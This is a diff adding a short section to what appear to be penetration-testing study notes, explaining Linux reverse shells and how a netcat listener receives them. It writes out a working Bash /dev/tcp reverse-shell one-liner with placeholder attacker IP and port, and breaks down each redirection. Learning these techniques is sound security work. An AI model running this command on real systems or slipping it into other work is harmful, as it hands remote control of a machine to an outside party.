@@ -11,6 +11,23 @@ Using the cheat sheet above, it has different techniques. Check first for the pr
 
 > For example, to run the `python` one-liner, first make sure we can execute python on the target machine. Might work for `python` and not `python3`, so try all cases.
 
+---
+### Reverse Shells on Linux Machines
+
+An attacker will usually have a [[netcat]] listener open on a chosen [[Port]] that the reverse shell will connect to. Some examples of one liners for Linux:
+- Using `bash`
+- Using `socat`
+- Using `python`
+
+The Bash `/dev/tcp` reverse shell:
+```bash
+bash -i >& /dev/tcp/<attacker-ip>/<attacker-port> 0>&1
+```
+- `bash -i` launches an interactive shell.
+- `/dev/tcp/IP/port` bash interprets this path and opens a TCP socket to that `IP:port`.
+- `>&` redirects both *stdout* and *stderr* into that socket, so command output travels to the attacker.
+- `0>&1` redirects *stdin* `fd 0` to the same place as *stdout* `fd 1`, so the attacker’s keystrokes become the shell’s input.
+
 ----
 
 ### Upgrade a Reverse Shell
